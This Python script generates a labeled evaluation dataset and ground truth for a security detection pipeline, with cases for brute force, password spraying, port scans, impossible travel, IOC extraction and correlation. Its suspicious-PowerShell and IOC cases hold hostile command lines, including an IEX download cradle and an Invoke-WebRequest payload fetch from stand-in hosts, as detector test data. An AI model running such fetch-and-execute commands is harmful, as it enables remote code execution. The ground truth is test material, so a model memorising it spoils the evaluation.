"""Generates data/eval/ — a held-out labeled dataset independent of
data/synthetic_events/ — plus its ground_truth.json. See DEF.md § Phase 12
for why this is generated rather than hand-written, and why it must be
independent of the dataset the rules/extractors/weights were tuned against.

Usage:
    uv run python -m app.evaluation.generate_dataset

Re-running overwrites data/eval/ deterministically (no randomness) — the
output is checked in, so this only needs to be re-run when the dataset
itself is deliberately changed.
"""

import json
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
EVAL_DIR = REPO_ROOT / "data" / "eval"

# A distinct "epoch" from data/synthetic_events/'s January 2026 dates —
# belt-and-suspenders independence on top of using entirely different
# hosts/IPs/usernames throughout.
BASE = datetime(2026, 3, 1, 6, 0, 0, tzinfo=UTC)


@dataclass
class DetectionCase:
    case_id: str
    source_type: str
    events: list[dict]
    expect_alert: bool
    expected_rule_key: str | None
    description: str
    marker: str  # unique host/ip embedded in every event of this case
    # Rules that are *legitimately* expected to also fire alongside
    # expected_rule_key, not counted as false positives if they do — e.g.
    # impossible_travel's precondition (same user, two different source
    # IPs) is structurally also suspicious_auth_pattern's "new IP for an
    # established user" signal. A real, inherent overlap between what
    # these two rules detect, not a dataset artifact — see DEF.md § Phase 12.
    also_expected_rule_keys: list[str] = field(default_factory=list)


@dataclass
class IOCCase:
    case_id: str
    source_type: str
    event: dict
    marker: str  # unique host on this event, for per-case attribution
    description: str
    # Positive case: this (type, value) pair must appear among the IOCs
    # extracted from this case's own event (TP if present, FN if not).
    expected_ioc_type: str | None = None
    expected_value: str | None = None
    # Negative case: this (type, value) pair must NOT appear among the
    # IOCs extracted from this case's own event (FP if present). Tests the
    # extractors' own filtering (private ranges in free-text scans,
    # reserved TLDs, malformed hash lengths) — never "did the pipeline
    # extract literally everything I didn't explicitly enumerate," which
    # would conflate correct-but-unlisted extractions with real errors.
    forbidden_ioc_type: str | None = None
    forbidden_value: str | None = None


@dataclass
class CorrelationCase:
    case_id: str
    events_by_source: dict[str, list[dict]]
    expect_single_incident: bool
    description: str


detection_cases: list[DetectionCase] = []
ioc_cases: list[IOCCase] = []
correlation_cases: list[CorrelationCase] = []


def _auth_event(ts: datetime, host: str, result: str, username: str, ip: str) -> dict:
    return {
        "timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": host,
        "event_result": result,
        "username": username,
        "source_ip": ip,
        "auth_method": "password",
        "service": "sshd",
    }


def _network_event(
    ts: datetime, host: str, src_ip: str, src_port: int, dst_ip: str, dst_port: int
) -> dict:
    return {
        "timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": host,
        "src_ip": src_ip,
        "src_port": src_port,
        "dst_ip": dst_ip,
        "dst_port": dst_port,
        "protocol": "tcp",
        "bytes_sent": 40,
        "bytes_received": 0,
    }


def _endpoint_event(
    ts: datetime, host: str, process_name: str, command_line: str, user: str, pid: int = 9000
) -> dict:
    return {
        "timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": host,
        "process_name": process_name,
        "command_line": command_line,
        "pid": pid,
        "parent_pid": pid - 1,
        "parent_process_name": "cmd.exe",
        "user": user,
    }


def _web_event(ts: datetime, host: str, method: str, path: str, status: int, ip: str) -> dict:
    return {
        "timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": host,
        "method": method,
        "path": path,
        "status_code": status,
        "source_ip": ip,
        "user_agent": "Mozilla/5.0 (Eval Dataset)",
    }


def _dns_event(
    ts: datetime, host: str, query_name: str, resolved_ips: list[str] | None = None
) -> dict:
    event = {
        "timestamp": ts.isoformat().replace("+00:00", "Z"),
        "host": host,
        "query_name": query_name,
        "query_type": "A",
        "response_code": "NOERROR",
        "resolver_ip": "10.9.0.2",
    }
    if resolved_ips:
        event["resolved_ips"] = resolved_ips
    return event


# --- ssh_brute_force: >=10 failures, 1 source IP, 1 host, within 300s ---
for i, count in enumerate([12, 15, 20], start=1):
    marker = f"eval-sshbf-tp{i}.internal"
    ip = f"203.0.{113 + i}.10"
    events = [
        _auth_event(BASE + timedelta(seconds=j * 20), marker, "failure", "svcacct", ip)
        for j in range(count)
    ]
    detection_cases.append(
        DetectionCase(
            f"ssh_brute_force_tp_{i}",
            "auth",
            events,
            True,
            "ssh_brute_force",
            f"{count} failed logins, 1 source IP, 1 host, within 300s — over the 10-failure threshold",
            marker,
        )
    )
for i, count in enumerate([5, 8], start=1):
    marker = f"eval-sshbf-tn{i}.internal"
    ip = f"203.0.{120 + i}.10"
    events = [
        _auth_event(BASE + timedelta(seconds=j * 20), marker, "failure", "svcacct", ip)
        for j in range(count)
    ]
    detection_cases.append(
        DetectionCase(
            f"ssh_brute_force_tn_{i}",
            "auth",
            events,
            False,
            None,
            f"{count} failed logins — under the 10-failure threshold, should not alert",
            marker,
        )
    )

# --- password_spraying: >=5 distinct usernames, <=3 attempts each, within
# 600s. Each case gets its own host (not just its own IP) — reusing one
# shared host across cases would pool their events under
# repeated_auth_failures' host-based grouping, a real cross-case
# contamination bug caught by an earlier run of this harness (see DEF.md
# § Phase 12). The 3rd positive case uses 9 users, not 10 — at exactly 10
# single-attempt failures from one IP it would also legitimately cross
# ssh_brute_force's own >=10 threshold, which is a real rule-overlap
# worth avoiding here rather than conflating with a genuine false positive.
for i, n_users in enumerate([6, 8, 9], start=1):
    marker_ip = f"198.51.{140 + i}.7"
    host = f"eval-spray-tp{i}.internal"
    events = [
        _auth_event(BASE + timedelta(seconds=j * 30), host, "failure", f"user{j}", marker_ip)
        for j in range(n_users)
    ]
    detection_cases.append(
        DetectionCase(
            f"password_spraying_tp_{i}",
            "auth",
            events,
            True,
            "password_spraying",
            f"{n_users} distinct usernames, 1 attempt each, 1 source IP, within 600s — over the 5-user threshold",
            marker_ip,
        )
    )
for i, n_users in enumerate([3, 4], start=1):
    marker_ip = f"198.51.{150 + i}.7"
    host = f"eval-spray-tn{i}.internal"
    events = [
        _auth_event(BASE + timedelta(seconds=j * 30), host, "failure", f"user{j}", marker_ip)
        for j in range(n_users)
    ]
    detection_cases.append(
        DetectionCase(
            f"password_spraying_tn_{i}",
            "auth",
            events,
            False,
            None,
            f"{n_users} distinct usernames — under the 5-user threshold, should not alert",
            marker_ip,
        )
    )

# --- suspicious_auth_pattern: off-hours (00:00-05:00 UTC) success login ---
OFF_HOURS = BASE.replace(hour=3, minute=0, second=0)
for i in range(1, 4):
    marker = f"eval-offhours-user{i}"
    events = [
        _auth_event(
            OFF_HOURS + timedelta(minutes=i),
            "eval-offhours-host.internal",
            "success",
            marker,
            "10.9.0.50",
        )
    ]
    detection_cases.append(
        DetectionCase(
            f"suspicious_auth_pattern_offhours_tp_{i}",
            "auth",
            events,
            True,
            "suspicious_auth_pattern",
            "Successful login at 03:00 UTC — off-hours",
            marker,
        )
    )
for i in range(1, 3):
    marker = f"eval-onhours-user{i}"
    events = [
        _auth_event(
            BASE.replace(hour=14, minute=0, second=0) + timedelta(minutes=i),
            "eval-onhours-host.internal",
            "success",
            marker,
            "10.9.0.51",
        )
    ]
    detection_cases.append(
        DetectionCase(
            f"suspicious_auth_pattern_tn_{i}",
            "auth",
            events,
            False,
            None,
            "Successful login at 14:00 UTC, normal hours, no prior-IP anomaly — should not alert",
            marker,
        )
    )

# --- repeated_auth_failures: >=20 failures, >=3 distinct source IPs, 1 host, within 900s ---
for i, (count, n_ips) in enumerate([(25, 4), (30, 5), (22, 3)], start=1):
    marker = f"eval-distfail-tp{i}.internal"
    events = [
        _auth_event(
            BASE + timedelta(seconds=j * 30),
            marker,
            "failure",
            "admin",
            f"192.0.2.{(i * 10 + (j % n_ips))}",
        )
        for j in range(count)
    ]
    detection_cases.append(
        DetectionCase(
            f"repeated_auth_failures_tp_{i}",
            "auth",
            events,
            True,
            "repeated_auth_failures",
            f"{count} failures across {n_ips} distinct source IPs, 1 host, within 900s",
            marker,
        )
    )
for i, (count, n_ips) in enumerate([(10, 2), (15, 2)], start=1):
    marker = f"eval-distfail-tn{i}.internal"
    events = [
        _auth_event(
            BASE + timedelta(seconds=j * 30),
            marker,
            "failure",
            "admin",
            f"192.0.3.{(i * 10 + (j % n_ips))}",
        )
        for j in range(count)
    ]
    detection_cases.append(
        DetectionCase(
            f"repeated_auth_failures_tn_{i}",
            "auth",
            events,
            False,
            None,
            f"{count} failures across only {n_ips} distinct IPs — under threshold, should not alert",
            marker,
        )
    )

# --- port_scanning: >=6 distinct dst ports, 1 src IP, within 60s ---
for i, n_ports in enumerate([7, 10, 15], start=1):
    marker_ip = f"198.51.{160 + i}.20"
    events = [
        _network_event(
            BASE + timedelta(seconds=j * 3),
            "eval-fw.internal",
            marker_ip,
            40000 + j,
            "10.9.0.5",
            20 + j,
        )
        for j in range(n_ports)
    ]
    detection_cases.append(
        DetectionCase(
            f"port_scanning_tp_{i}",
            "network",
            events,
            True,
            "port_scanning",
            f"{n_ports} distinct destination ports within 60s from one source IP",
            marker_ip,
        )
    )
for i, n_ports in enumerate([3, 4], start=1):
    marker_ip = f"198.51.{170 + i}.20"
    events = [
        _network_event(
            BASE + timedelta(seconds=j * 3),
            "eval-fw.internal",
            marker_ip,
            40000 + j,
            "10.9.0.5",
            20 + j,
        )
        for j in range(n_ports)
    ]
    detection_cases.append(
        DetectionCase(
            f"port_scanning_tn_{i}",
            "network",
            events,
            False,
            None,
            f"{n_ports} distinct ports — under the 6-port threshold, should not alert",
            marker_ip,
        )
    )

# --- suspicious_powershell: encoded/hidden/bypass/download-cradle indicators ---
_PS_POSITIVE = [
    (
        "-enc",
        "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA",
    ),
    (
        "hidden+bypass",
        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File payload.ps1",
    ),
    (
        "download-cradle",
        "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://eval-c2.example/p')",
    ),
]
for i, (label, cmdline) in enumerate(_PS_POSITIVE, start=1):
    marker = f"eval-ps-tp{i}.internal"
    events = [
        _endpoint_event(BASE + timedelta(seconds=i), marker, "powershell.exe", cmdline, "svc-eval")
    ]
    detection_cases.append(
        DetectionCase(
            f"suspicious_powershell_tp_{i}",
            "endpoint",
            events,
            True,
            "suspicious_powershell",
            f"PowerShell command line matching the {label} indicator",
            marker,
        )
    )
_PS_NEGATIVE = [
    ("plain", "powershell.exe -File C:\\Scripts\\backup.ps1"),
    ("non-powershell", "notepad.exe C:\\Users\\eval\\notes.txt"),
]
for i, (label, cmdline) in enumerate(_PS_NEGATIVE, start=1):
    marker = f"eval-ps-tn{i}.internal"
    process = "powershell.exe" if "powershell" in cmdline else "notepad.exe"
    events = [_endpoint_event(BASE + timedelta(seconds=i), marker, process, cmdline, "svc-eval")]
    detection_cases.append(
        DetectionCase(
            f"suspicious_powershell_tn_{i}",
            "endpoint",
            events,
            False,
            None,
            f"{label} command line, no suspicious indicators — should not alert",
            marker,
        )
    )

# --- impossible_travel: necessarily reuses StaticGeoIPResolver's fixed IPs
# (see DEF.md § Phase 12 and [[geoip-resolver-stub]] — a documented
# limitation, not an oversight). Distinct usernames/hosts/timestamps.
_GEO_A, _GEO_B, _GEO_C = "203.0.113.7", "198.51.100.23", "198.51.100.88"
for i, (ip_a, ip_b, gap_minutes) in enumerate(
    [(_GEO_A, _GEO_B, 10), (_GEO_B, _GEO_C, 15)], start=1
):
    marker = f"eval-travel-tp{i}"
    events = [
        _auth_event(BASE, "eval-travel-host.internal", "success", marker, ip_a),
        _auth_event(
            BASE + timedelta(minutes=gap_minutes),
            "eval-travel-host.internal",
            "success",
            marker,
            ip_b,
        ),
    ]
    detection_cases.append(
        DetectionCase(
            f"impossible_travel_tp_{i}",
            "auth",
            events,
            True,
            "impossible_travel",
            f"Same user, {ip_a} then {ip_b} {gap_minutes} minutes apart — implies impossible speed",
            marker,
            also_expected_rule_keys=["suspicious_auth_pattern"],
        )
    )
_marker_neg = "eval-travel-tn1"
detection_cases.append(
    DetectionCase(
        "impossible_travel_tn_1",
        "auth",
        [
            _auth_event(BASE, "eval-travel-host.internal", "success", _marker_neg, _GEO_A),
            _auth_event(
                BASE + timedelta(hours=20),
                "eval-travel-host.internal",
                "success",
                _marker_neg,
                _GEO_B,
            ),
        ],
        False,
        None,
        "Same user, two distant locations, but 20 hours apart — plausible travel time",
        _marker_neg,
        also_expected_rule_keys=["suspicious_auth_pattern"],
    )
)

# --- IOC ground-truth cases: one per IOCType (positive), plus a few
# explicit negative cases exercising the extractors' own filtering
# (private ranges in free-text scans, reserved TLDs, malformed hash
# length) — precision is measured against these, never against "did the
# pipeline extract anything beyond what I explicitly enumerated," which
# would conflate other correct-but-unlisted extractions with real errors.
ioc_cases.extend(
    [
        IOCCase(
            "ioc_ipv4",
            "network",
            _network_event(BASE, "eval-ioc-fw.internal", "185.220.101.204", 51000, "10.9.0.5", 443),
            "185.220.101.204",
            "Public IPv4 in a network event's src_ip",
            expected_ioc_type="ipv4",
            expected_value="185.220.101.204",
        ),
        IOCCase(
            "ioc_ipv6",
            "dns",
            _dns_event(
                BASE, "eval-ioc-dns.internal", "eval-ipv6-lookup.example", ["2606:4700:4701::1234"]
            ),
            "eval-ioc-dns.internal",
            "Public IPv6 in a DNS response's resolved_ips",
            expected_ioc_type="ipv6",
            expected_value="2606:4700:4701::1234",
        ),
        IOCCase(
            "ioc_domain",
            "dns",
            _dns_event(BASE, "eval-ioc-dns2.internal", "eval-c2-beacon.example"),
            "eval-ioc-dns2.internal",
            "Domain in a DNS query_name",
            expected_ioc_type="domain",
            expected_value="eval-c2-beacon.example",
        ),
        IOCCase(
            "ioc_url",
            "endpoint",
            _endpoint_event(
                BASE,
                "eval-ioc-ws.internal",
                "powershell.exe",
                'powershell.exe -Command "Invoke-WebRequest -Uri http://eval-payload-host.example/drop.bin"',
                "svc-eval",
            ),
            "eval-ioc-ws.internal",
            "URL embedded in a command line",
            expected_ioc_type="url",
            expected_value="http://eval-payload-host.example/drop.bin",
        ),
        IOCCase(
            "ioc_email",
            "web",
            _web_event(
                BASE,
                "eval-ioc-web.internal",
                "POST",
                "/api/reset?email=eval-victim@example.com",
                200,
                "10.9.0.60",
            ),
            "eval-ioc-web.internal",
            "Email address in a web request path",
            expected_ioc_type="email",
            expected_value="eval-victim@example.com",
        ),
        IOCCase(
            "ioc_file_hash_md5",
            "endpoint",
            _endpoint_event(
                BASE,
                "eval-ioc-ws2.internal",
                "cmd.exe",
                "certutil -hashfile p.bin MD5 d41d8cd98f00b204e9800998ecf8427e",
                "svc-eval",
            ),
            "eval-ioc-ws2.internal",
            "MD5 hash in a command line",
            expected_ioc_type="file_hash_md5",
            expected_value="d41d8cd98f00b204e9800998ecf8427e",
        ),
        IOCCase(
            "ioc_file_hash_sha1",
            "endpoint",
            _endpoint_event(
                BASE,
                "eval-ioc-ws3.internal",
                "cmd.exe",
                "certutil -hashfile p.bin SHA1 da39a3ee5e6b4b0d3255bfef95601890afd80709",
                "svc-eval",
            ),
            "eval-ioc-ws3.internal",
            "SHA1 hash in a command line",
            expected_ioc_type="file_hash_sha1",
            expected_value="da39a3ee5e6b4b0d3255bfef95601890afd80709",
        ),
        IOCCase(
            "ioc_file_hash_sha256",
            "endpoint",
            _endpoint_event(
                BASE,
                "eval-ioc-ws4.internal",
                "cmd.exe",
                "certutil -hashfile p.bin SHA256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "svc-eval",
            ),
            "eval-ioc-ws4.internal",
            "SHA256 hash in a command line",
            expected_ioc_type="file_hash_sha256",
            expected_value="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        ),
        IOCCase(
            "ioc_username",
            "auth",
            _auth_event(BASE, "eval-ioc-auth.internal", "failure", "eval-ghost-user", "10.9.0.70"),
            "eval-ioc-auth.internal",
            "Username field on an auth event",
            expected_ioc_type="username",
            expected_value="eval-ghost-user",
        ),
        # --- negative cases: values that should NOT be extracted ---
        IOCCase(
            "ioc_negative_private_ip_scan",
            "endpoint",
            _endpoint_event(
                BASE,
                "eval-ioc-neg1.internal",
                "cmd.exe",
                "ping -t 10.9.0.201 to check connectivity",
                "svc-eval",
            ),
            "eval-ioc-neg1.internal",
            "Private IP in free text (command_line scan) — ipv4.scan() filters private ranges",
            forbidden_ioc_type="ipv4",
            forbidden_value="10.9.0.201",
        ),
        IOCCase(
            "ioc_negative_reserved_domain_scan",
            "endpoint",
            _endpoint_event(
                BASE,
                "eval-ioc-neg2.internal",
                "cmd.exe",
                "backing up to eval-backup-host.internal over SMB",
                "svc-eval",
            ),
            "eval-ioc-neg2.internal",
            "Reserved-TLD hostname in free text — domain.scan() filters .internal",
            forbidden_ioc_type="domain",
            forbidden_value="eval-backup-host.internal",
        ),
        IOCCase(
            "ioc_negative_malformed_hash",
            "endpoint",
            _endpoint_event(
                BASE,
                "eval-ioc-neg3.internal",
                "cmd.exe",
                "checksum was deadbeef01 for the file",
                "svc-eval",
            ),
            "eval-ioc-neg3.internal",
            "10-char hex string — too short/wrong-length to be a real file hash",
            forbidden_ioc_type="file_hash_md5",
            forbidden_value="deadbeef01",
        ),
    ]
)

# --- correlation cases ---
_corr_ip = "203.0.113.240"
_corr_host = "eval-corr-target.internal"
_corr_host_ip = "10.9.0.99"
multi_stage_events = {
    "auth": [
        _auth_event(BASE + timedelta(seconds=j * 20), _corr_host, "failure", "admin", _corr_ip)
        for j in range(12)
    ],
    "network": [
        _network_event(
            BASE + timedelta(minutes=6, seconds=j * 3),
            "eval-corr-fw.internal",
            _corr_ip,
            40000 + j,
            _corr_host_ip,
            20 + j,
        )
        for j in range(8)
    ],
    "endpoint": [
        _endpoint_event(
            BASE + timedelta(minutes=10),
            _corr_host,
            "powershell.exe",
            "powershell.exe -Enc SQBFAFgA -WindowStyle Hidden",
            "admin",
        )
    ],
}
correlation_cases.append(
    CorrelationCase(
        "multi_stage",
        multi_stage_events,
        True,
        "SSH brute force -> port scan -> PowerShell, same attacker IP/host — should merge into one incident",
    )
)

unrelated_events = {
    "auth": [
        *[
            _auth_event(
                BASE + timedelta(seconds=j * 20),
                "eval-unrelated-a.internal",
                "failure",
                "admin",
                "192.0.2.201",
            )
            for j in range(11)
        ],
        *[
            _auth_event(
                BASE + timedelta(days=3, seconds=j * 20),
                "eval-unrelated-b.internal",
                "failure",
                "admin",
                "192.0.2.202",
            )
            for j in range(11)
        ],
    ]
}
correlation_cases.append(
    CorrelationCase(
        "unrelated_pair",
        unrelated_events,
        False,
        "Two standalone ssh_brute_force bursts, different hosts/IPs, 3 days apart — must stay separate incidents",
    )
)


def _write_jsonl(path: Path, events: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")


def main() -> None:
    by_source: dict[str, list[dict]] = {}
    for case in detection_cases:
        by_source.setdefault(case.source_type, []).extend(case.events)
    for case in ioc_cases:
        by_source.setdefault(case.source_type, []).append(case.event)

    for source_type, events in by_source.items():
        _write_jsonl(EVAL_DIR / "events" / f"{source_type}.jsonl", events)

    for case in correlation_cases:
        for source_type, events in case.events_by_source.items():
            if events:
                _write_jsonl(EVAL_DIR / "scenarios" / case.case_id / f"{source_type}.jsonl", events)

    ground_truth = {
        "dataset_version": "eval-v1",
        "detection_cases": [
            {
                "case_id": c.case_id,
                "source_type": c.source_type,
                "marker": c.marker,
                "expect_alert": c.expect_alert,
                "expected_rule_key": c.expected_rule_key,
                "also_expected_rule_keys": c.also_expected_rule_keys,
                "description": c.description,
            }
            for c in detection_cases
        ],
        "ioc_cases": [
            {
                "case_id": c.case_id,
                "marker": c.marker,
                "expected_ioc_type": c.expected_ioc_type,
                "expected_value": c.expected_value,
                "forbidden_ioc_type": c.forbidden_ioc_type,
                "forbidden_value": c.forbidden_value,
                "description": c.description,
            }
            for c in ioc_cases
        ],
        "correlation_cases": [
            {
                "case_id": c.case_id,
                "source_types": list(c.events_by_source.keys()),
                "expect_single_incident": c.expect_single_incident,
                "description": c.description,
            }
            for c in correlation_cases
        ],
    }
    with (EVAL_DIR / "ground_truth.json").open("w", encoding="utf-8") as f:
        json.dump(ground_truth, f, indent=2)
        f.write("\n")

    print(
        f"Generated {len(detection_cases)} detection cases, {len(ioc_cases)} IOC cases, "
        f"{len(correlation_cases)} correlation cases -> {EVAL_DIR}"
    )


if __name__ == "__main__":
    main()
